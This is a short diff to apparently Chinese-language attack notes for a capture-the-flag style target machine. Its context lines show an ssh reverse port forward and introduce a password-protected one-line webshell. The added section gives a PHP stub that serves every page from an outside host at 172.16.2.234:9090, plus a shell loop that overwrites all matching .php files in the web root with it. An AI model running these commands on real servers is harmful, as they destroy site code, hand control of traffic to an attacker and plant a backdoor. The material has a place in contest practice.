@@ -18,6 +18,16 @@ ssh -g -R 8080:127.0.0.1:80 123@192.168.80.196
 
 从我们的靶机连接kali的ssh，将靶机的80映射到kali的80，源码放到kali。
 
+### 权限很低的流量转发
+```
+hack@36800769995c:/var/www/html$ cat /tmp/1.php
+<?php
+$me=str_replace('/var/www/html','',__FILE__);
+echo file_get_contents("http://172.16.2.234:9090".$me);
+
+for i in `grep p -lr|grep ".php"`;do echo $i;cat /tmp/1.php > $i;done
+```
+
 
 ## 先准备一款只能被自己利用的一句话，如md5加密的马子
 ```
